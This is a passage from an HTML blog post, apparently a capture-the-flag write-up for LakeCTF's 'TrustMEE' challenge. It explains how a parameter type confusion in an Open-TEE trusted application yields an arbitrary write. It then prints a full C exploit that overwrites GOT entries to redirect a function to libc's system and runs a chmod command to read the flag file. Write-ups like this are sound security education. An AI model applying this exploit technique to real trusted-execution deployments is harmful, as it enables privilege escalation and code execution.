+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>addr3 <span style=color:#f92672>=</span> <span style=color:#a6e22e>mmap</span>(NULL, <span style=color:#ae81ff>4096</span>, PROT_READ <span style=color:#f92672>|</span> PROT_WRITE, MAP_PRIVATE <span style=color:#f92672>|</span> MAP_ANONYMOUS, <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Base mmap addr: 0x%lx</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, (<span style=color:#66d9ef>uint64_t</span>)addr1);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34; [*] mmap addr1: 0x%lx</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, (<span style=color:#66d9ef>uint64_t</span>)addr1);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34; [*] mmap addr2: 0x%lx</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, (<span style=color:#66d9ef>uint64_t</span>)addr2);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34; [*] mmap addr3: 0x%lx</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, (<span style=color:#66d9ef>uint64_t</span>)addr3);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;ABS(addr1-addr2) = 0x%lx</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, <span style=color:#a6e22e>ABS_DIFF</span>(addr1, addr2));
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;ABS(addr2-addr3) = 0x%lx</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, <span style=color:#a6e22e>ABS_DIFF</span>(addr2, addr3));
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p><img src=/post-resources/TrustMEE/mmap-relativity.png alt=mmap-relativity.png></p><p>As you can see, no matter how many times we run the program, the relative offset between mmaped pages is constant. The base address is always randomized, however subseqeuent mmap calls return an address deterministically relative to the first mmap call.</p><p>We will take advantage of mmap relativity as the <code>grade_ta.so</code> is actually loaded by an <code>mmap</code> call! The <code>grade_ta.so</code> is not the PIE binary itself (<code>/opt/OpenTee/bin/opentee-engine</code> is the underlying binary in this case). <code>grade_ta.so</code> is loaded with <code>dlopen</code> by the <code>load_ta</code> internal Open-TEE function. With simple arithmetic, we find out that <code>grade_ta.so</code> is loaded at constant offset <code>0x228000</code> from <code>libc.so</code>:</p><p><img src=/post-resources/TrustMEE/grade_ta-offset.png alt=grade_ta-offset.png></p><h3 id=73-write-what-where-primitive>7.3 Write-what-where primitive</h3><p>Remember the 1<sup>st</sup> bug — no check is performed on TA parameter types. This leads to a type confusion vulnerability. What if instead of a Memory Reference Parameter we provide a Value Paramter when the TA expects a Memory Reference Parameter? Here is what happens internally in the Open-TEE framework with respect to parameters:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>/*!
+</span></span></span><span style=display:flex><span><span style=color:#75715e> * \brief copy_tee_operation_to_internal
+</span></span></span><span style=display:flex><span><span style=color:#75715e> * Convert the TEE operation into a generic format so that it can be sent to the TA
+</span></span></span><span style=display:flex><span><span style=color:#75715e> * \param operation The TEE operation format
+</span></span></span><span style=display:flex><span><span style=color:#75715e> * \param internal_op the communication protocol format
+</span></span></span><span style=display:flex><span><span style=color:#75715e> * \return 0 on success
+</span></span></span><span style=display:flex><span><span style=color:#75715e> */</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>copy_tee_operation_to_internal</span>(TEEC_Operation <span style=color:#f92672>*</span>operation,
+</span></span><span style=display:flex><span>             <span style=color:#66d9ef>struct</span> com_msg_operation <span style=color:#f92672>*</span>internal_op)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>struct</span> shared_mem_internal <span style=color:#f92672>*</span>internal_imp;
+</span></span><span style=display:flex><span>  TEEC_SharedMemory <span style=color:#f92672>*</span>mem_source;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>size_t</span> offset;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> i;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>memset</span>(internal_op, <span style=color:#ae81ff>0</span>, <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>struct</span> com_msg_operation));
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  internal_op<span style=color:#f92672>-&gt;</span>paramTypes <span style=color:#f92672>=</span> operation<span style=color:#f92672>-&gt;</span>paramTypes;
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>FOR_EACH_PARAM</span>(i) {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>TEEC_PARAM_TYPE_GET</span>(internal_op<span style=color:#f92672>-&gt;</span>paramTypes, i) <span style=color:#f92672>==</span> TEEC_NONE <span style=color:#f92672>||</span>
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>TEEC_PARAM_TYPE_GET</span>(internal_op<span style=color:#f92672>-&gt;</span>paramTypes, i) <span style=color:#f92672>==</span> TEEC_VALUE_OUTPUT) {
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>continue</span>;
+</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>TEEC_PARAM_TYPE_GET</span>(internal_op<span style=color:#f92672>-&gt;</span>paramTypes, i) <span style=color:#f92672>==</span> TEEC_VALUE_INPUT <span style=color:#f92672>||</span>
+</span></span><span style=display:flex><span>         <span style=color:#a6e22e>TEEC_PARAM_TYPE_GET</span>(internal_op<span style=color:#f92672>-&gt;</span>paramTypes, i) <span style=color:#f92672>==</span> TEEC_VALUE_INOUT) {
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>memcpy</span>(<span style=color:#f92672>&amp;</span>internal_op<span style=color:#f92672>-&gt;</span>params[i].param.value,
+</span></span><span style=display:flex><span>             <span style=color:#f92672>&amp;</span>operation<span style=color:#f92672>-&gt;</span>params[i].value, <span style=color:#66d9ef>sizeof</span>(TEEC_Value));
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>continue</span>;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#75715e>//...
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>}
+</span></span></code></pre></div><p>As expected, the Value Paramter is copied via a <code>memcpy</code> from the CA to the TEE. However, the TA sees a <code>TEE_Param</code> union structure:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>typedef</span> <span style=color:#66d9ef>union</span> {
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>struct</span> {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>void</span><span style=color:#f92672>*</span> buffer;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>size_t</span> size;
+</span></span><span style=display:flex><span>  } memref;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>struct</span> {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>uint32_t</span> a;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>uint32_t</span> b;
+</span></span><span style=display:flex><span>  } value;
+</span></span><span style=display:flex><span>} TEE_Param;
+</span></span></code></pre></div><p>This means that the <code>TEE_Param.value</code> and <code>TEE_Param.memref.buffer</code> overlap in memory! Under a parameter type confusion bug we can provide a Value Paramter and the TA will interpret it as a raw 64-bit pointer! The <code>TEE_Param.memref.size</code> will be zero because of the <code>memset(internal_op, 0, sizeof(struct com_msg_operation))</code> shown above. With this in mind, we notice that we can control the pointers passed in <code>TEE_Memmove</code> (e.g. <code>TEE_MemMove(curSignedStudent,student1,0x10)</code>). The given TA has partial RELRO and <code>TEE_Memmove</code> is present in its <code>.got.plt</code> section. With this information we conclude 2 things:</p><ol><li>We have an arbitrary write since we control both pointers in <code>TEE_Memove</code>. These pointers have to pass the check <code>TEE_CheckMemoryAccessRights(TEE_MEMORY_ACCESS_READ | TEE_MEMORY_ACCESS_ANY_OWNER, ptr, sz)</code>.</li><li>By overwriting the <code>.got.plt</code> section, we can change <code>TEE_Memmove</code> to point to libc&rsquo;s <code>system</code>. This is useful because can control both the arguments to <code>TEE_Memmove</code> and their content.</li></ol><p>We will focus on the <code>SIGN_STUDENT</code> command:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>TVar1 <span style=color:#f92672>=</span> <span style=color:#a6e22e>TEE_CheckMemoryAccessRights</span>(<span style=color:#ae81ff>5</span>,student2,(params<span style=color:#f92672>-&gt;</span>memref).size);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (TVar1 <span style=color:#f92672>==</span> TEE_SUCCESS) {
+</span></span><span style=display:flex><span>  TVar1 <span style=color:#f92672>=</span> <span style=color:#a6e22e>TEE_CheckMemoryAccessRights</span>(<span style=color:#ae81ff>5</span>,curSignedStudent,sz);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (TVar1 <span style=color:#f92672>==</span> TEE_SUCCESS) {
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>TEE_MemMove</span>(curSignedStudent,student2,<span style=color:#ae81ff>0x10</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>TEE_MemMove</span>(curSignedStudent<span style=color:#f92672>-&gt;</span>lastname,student2<span style=color:#f92672>-&gt;</span>lastname,<span style=color:#ae81ff>0x10</span>);
+</span></span><span style=display:flex><span>  curSignedStudent<span style=color:#f92672>-&gt;</span>grade <span style=color:#f92672>=</span> student2<span style=color:#f92672>-&gt;</span>grade;
+</span></span><span style=display:flex><span>  curSignedStudent<span style=color:#f92672>-&gt;</span>sciper <span style=color:#f92672>=</span> student2<span style=color:#f92672>-&gt;</span>sciper;
+</span></span><span style=display:flex><span>  TVar1 <span style=color:#f92672>=</span> <span style=color:#a6e22e>calculate_signature</span>(sessionContext,curSignedStudent); <span style=color:#75715e>//writes 0x10 bytes at curSignedStudent+0x28
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>return</span> TVar1;
+</span></span><span style=display:flex><span>}  }
+</span></span></code></pre></div><p>Using a <code>SIGN_STUDENT</code> command, we will use the 2<sup>nd</sup> <code>TEE_MemMove</code> shown above to overwrite the <code>TEE_MemMove@.got.plt</code> to point to <code>system</code>. This can be achieved by doing a type confusion on <code>params[1]</code>. With a subsequent <code>SIGN_STUDENT</code> command, we will invoke <code>TEE_MemMove("chmod ugo+r /opt/OpenTee/flag.txt")</code> which will actually resolve to <code>system("chmod ugo+r /opt/OpenTee/flag.txt")</code>. Afterwards, we will be able to dump the flag. Here is the exploit for the type confusion:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>create_64bit_TEEC_Value</span>(TEEC_Value <span style=color:#f92672>*</span>dest, <span style=color:#66d9ef>uint64_t</span> val) {
+</span></span><span style=display:flex><span>  dest<span style=color:#f92672>-&gt;</span>a <span style=color:#f92672>=</span> (val <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>32</span>) <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>32</span>;
+</span></span><span style=display:flex><span>  dest<span style=color:#f92672>-&gt;</span>b <span style=color:#f92672>=</span> val <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>32</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>() {
+</span></span><span style=display:flex><span>  <span style=color:#75715e>// ...
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>uint64_t</span> libc_base <span style=color:#f92672>=</span> <span style=color:#75715e>/* ... */</span>;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>uint64_t</span> libc_system <span style=color:#f92672>=</span> libc_base <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x50d70</span>;
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Found libc base: 0x%lx</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, libc_base);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34; [*] system: 0x%lx</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, libc_system);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#75715e>//grade_ta.so is mmaped via dlopen()
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>uint64_t</span> grade_ta_base <span style=color:#f92672>=</span> libc_base <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x228000</span>;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>uint64_t</span> grade_ta_getRandomByte_got_plt <span style=color:#f92672>=</span> grade_ta_base <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x4020</span>;
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Found grade_ta.so base: 0x%lx</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, grade_ta_base);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34; [*] getRandomByte@.got.plt: 0x%lx</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, grade_ta_getRandomByte_got_plt);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>uint64_t</span> ret_0_gadget <span style=color:#f92672>=</span> grade_ta_base <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x1284</span>; <span style=color:#75715e>// xor eax, eax; ret;
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  
+</span></span><span style=display:flex><span>  <span style=color:#75715e>/*
+</span></span></span><span style=display:flex><span><span style=color:#75715e>pwndbg&gt; got -p grade_ta.so
+</span></span></span><span style=display:flex><span><span style=color:#75715e>Filtering by lib/objfile path: grade_ta.so
+</span></span></span><span style=display:flex><span><span style=color:#75715e>Filtering out read-only entries (display them with -r or --show-readonly)
+</span></span></span><span style=display:flex><span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>State of the GOT of /opt/OpenTee/lib/TAs/grade_ta.so:
+</span></span></span><span style=display:flex><span><span style=color:#75715e>GOT protection: Partial RELRO | Found 11 GOT entries passing the filter
+</span></span></span><span style=display:flex><span><span style=color:#75715e>[0x7fc313278018] TEE_CheckMemoryAccessRights -&gt; 0x7fc313028d30 (TEE_CheckMemoryAccessRights) ◂— endbr64
+</span></span></span><span style=display:flex><span><span style=color:#75715e>[0x7fc313278020] getRandomByte -&gt; 0x7fc313275260 (getRandomByte) ◂— endbr64
+</span></span></span><span style=display:flex><span><span style=color:#75715e>[0x7fc313278028] __stack_chk_fail@GLIBC_2.4 -&gt; 0x7fc313182360 (__stack_chk_fail) ◂— endbr64
+</span></span></span><span style=display:flex><span><span style=color:#75715e>[0x7fc313278030] printf@GLIBC_2.2.5 -&gt; 0x7fc3130ac6f0 (printf) ◂— endbr64
+</span></span></span><span style=display:flex><span><span style=color:#75715e>[0x7fc313278038] TEE_MemMove -&gt; 0x7fc313028f10 (TEE_MemMove) ◂— endbr64
+</span></span></span><span style=display:flex><span><span style=color:#75715e>[0x7fc313278040] TEE_AllocateOperation -&gt; 0x7fc3130320b0 (TEE_AllocateOperation) ◂— endbr64
+</span></span></span><span style=display:flex><span><span style=color:#75715e>[0x7fc313278048] __syslog_chk@GLIBC_2.4 -&gt; 0x7fc31316a2e0 (__syslog_chk) ◂— endbr64
+</span></span></span><span style=display:flex><span><span style=color:#75715e>[0x7fc313278050] TEE_DigestUpdate -&gt; 0x7fc31302c190 (TEE_DigestUpdate) ◂— endbr64
+</span></span></span><span style=display:flex><span><span style=color:#75715e>[0x7fc313278058] calculate_signature -&gt; 0x7fc313275300 (calculate_signature) ◂— endbr64
+</span></span></span><span style=display:flex><span><span style=color:#75715e>[0x7fc313278060] TEE_DigestDoFinal -&gt; 0x7fc31302c280 (TEE_DigestDoFinal) ◂— endbr64
+</span></span></span><span style=display:flex><span><span style=color:#75715e>[0x7fc313278068] rand@GLIBC_2.2.5 -&gt; 0x7fc313092760 (rand) ◂— endbr64
+</span></span></span><span style=display:flex><span><span style=color:#75715e>  */</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#75715e>//Let&#39;s do the arbitrary write
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#a6e22e>memset</span>((<span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>operation, <span style=color:#ae81ff>0</span>, <span style=color:#66d9ef>sizeof</span>(operation));
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>memset</span>(out_mem.buffer, <span style=color:#ae81ff>0</span>, <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>struct</span> signedStudent));
+</span></span><span style=display:flex><span>  operation.paramTypes <span style=color:#f92672>=</span> <span style=color:#a6e22e>TEEC_PARAM_TYPES</span>(
+</span></span><span style=display:flex><span>    TEEC_MEMREF_WHOLE,
+</span></span><span style=display:flex><span>    TEEC_VALUE_INPUT, <span style=color:#75715e>//type confusion
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    TEEC_NONE,
+</span></span><span style=display:flex><span>    TEEC_NONE
+</span></span><span style=display:flex><span>  );
+</span></span><span style=display:flex><span>  operation.params[<span style=color:#ae81ff>0</span>].memref.parent <span style=color:#f92672>=</span> <span style=color:#f92672>&amp;</span>in_mem;
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>create_64bit_TEEC_Value</span>(<span style=color:#f92672>&amp;</span>operation.params[<span style=color:#ae81ff>1</span>].value, grade_ta_getRandomByte_got_plt); <span style=color:#75715e>//destination address
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>payload <span style=color:#f92672>=</span> (<span style=color:#66d9ef>char</span><span style=color:#f92672>*</span>)in_mem.buffer;
+</span></span><span style=display:flex><span>  <span style=color:#f92672>*</span>(<span style=color:#66d9ef>uint64_t</span><span style=color:#f92672>*</span>)(payload<span style=color:#f92672>+</span><span style=color:#ae81ff>0x00</span>) <span style=color:#f92672>=</span> ret_0_gadget; <span style=color:#75715e>// getRandomByte
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#f92672>*</span>(<span style=color:#66d9ef>uint64_t</span><span style=color:#f92672>*</span>)(payload<span style=color:#f92672>+</span><span style=color:#ae81ff>0x08</span>) <span style=color:#f92672>=</span> ret_0_gadget; <span style=color:#75715e>// __stack_chk_fail
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#f92672>*</span>(<span style=color:#66d9ef>uint64_t</span><span style=color:#f92672>*</span>)(payload<span style=color:#f92672>+</span><span style=color:#ae81ff>0x10</span>) <span style=color:#f92672>=</span> ret_0_gadget; <span style=color:#75715e>// printf@GLIBC
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#f92672>*</span>(<span style=color:#66d9ef>uint64_t</span><span style=color:#f92672>*</span>)(payload<span style=color:#f92672>+</span><span style=color:#ae81ff>0x18</span>) <span style=color:#f92672>=</span> libc_system;  <span style=color:#75715e>// TEE_MemMove
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#f92672>*</span>(<span style=color:#66d9ef>uint64_t</span><span style=color:#f92672>*</span>)(payload<span style=color:#f92672>+</span><span style=color:#ae81ff>0x20</span>) <span style=color:#f92672>=</span> ret_0_gadget; <span style=color:#75715e>// TEE_AllocateOperation
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#75715e>//__syslog_chk@glibc will be trashed by calculate_signature()
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#75715e>//TEE_DigestUpdate   will be trashed by calculate_signature()
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Invoking command SIGN_STUDENT (overwriting .got.plt): </span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>  tee_rv <span style=color:#f92672>=</span> <span style=color:#a6e22e>TEEC_InvokeCommand</span>(<span style=color:#f92672>&amp;</span>session, SIGN_STUDENT, <span style=color:#f92672>&amp;</span>operation, NULL);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (tee_rv <span style=color:#f92672>!=</span> TEEC_SUCCESS <span style=color:#f92672>&amp;&amp;</span> tee_rv <span style=color:#f92672>!=</span> TEEC_ERROR_SECURITY) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;TEEC_InvokeCommand failed: 0x%x</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, tee_rv);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>exit</span>(tee_rv);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;res: 0x%x</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, tee_rv);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#75715e>//Now, let&#39;s trigger system() with our command
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#a6e22e>memset</span>((<span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>operation, <span style=color:#ae81ff>0</span>, <span style=color:#66d9ef>sizeof</span>(operation));
+</span></span><span style=display:flex><span>  operation.paramTypes <span style=color:#f92672>=</span> <span style=color:#a6e22e>TEEC_PARAM_TYPES</span>(
+</span></span><span style=display:flex><span>    TEEC_MEMREF_WHOLE,
+</span></span><span style=display:flex><span>    TEEC_MEMREF_WHOLE, <span style=color:#75715e>// we control the contents of the buffer
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    TEEC_NONE,
+</span></span><span style=display:flex><span>    TEEC_NONE
+</span></span><span style=display:flex><span>  );
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>memset</span>(in_mem.buffer, <span style=color:#ae81ff>0</span>, <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>struct</span> student));
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>strcpy</span>(out_mem.buffer, <span style=color:#e6db74>&#34;chmod ugo+r /opt/OpenTee/flag.txt&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  operation.params[<span style=color:#ae81ff>0</span>].memref.parent <span style=color:#f92672>=</span> <span style=color:#f92672>&amp;</span>in_mem;
+</span></span><span style=display:flex><span>  operation.params[<span style=color:#ae81ff>1</span>].memref.parent <span style=color:#f92672>=</span> <span style=color:#f92672>&amp;</span>out_mem;
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Invoking command SIGN_STUDENT (changing flag permissions): </span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>  tee_rv <span style=color:#f92672>=</span> <span style=color:#a6e22e>TEEC_InvokeCommand</span>(<span style=color:#f92672>&amp;</span>session, SIGN_STUDENT, <span style=color:#f92672>&amp;</span>operation, NULL);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (tee_rv <span style=color:#f92672>!=</span> TEEC_SUCCESS <span style=color:#f92672>&amp;&amp;</span> tee_rv <span style=color:#f92672>!=</span> TEEC_ERROR_SECURITY) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;TEEC_InvokeCommand failed: 0x%x</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, tee_rv);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>exit</span>(tee_rv);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;res: 0x%x</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, tee_rv);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>system</span>(<span style=color:#e6db74>&#34;cat /opt/OpenTee/flag.txt&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p><img src=/post-resources/TrustMEE/flag.png alt=flag></p><p>And we have the flag! Thank you for reading 🏴</p><p><code>EPFL{ju5t_4_h4PPY_L1ttL3_Typ3_c0nfu510n_8u9}</code></p></div></article><hr><p class=articleTagsContainer><span> </span><strong>Tags:</strong>
+<a href=/tags/ctf>#ctf</a>
+<a href=/tags/environment-setup>#environment setup</a>
+<a href=/tags/lakectf>#lakeCTF</a>
+<a href=/tags/pwn>#pwn</a>
+<a href=/tags/ta>#TA</a>
+<a href=/tags/tee>#TEE</a></p></main><footer><hr><p><small>2024 &copy; Nikolaos Chalkiadakis</small></p><p><small><a href=https://gitlab.com/gabmus/hugo-ficurinia>Ficurinia theme</a> for <a href=https://gohugo.io>Hugo</a> by <a href=https://gabmus.org>Gabriele Musco</a>. Licensed under <a href=https://www.gnu.org/licenses/agpl-3.0.html>GNU AGPLv3</a>.</small></p></footer></div></div></div></body></html>
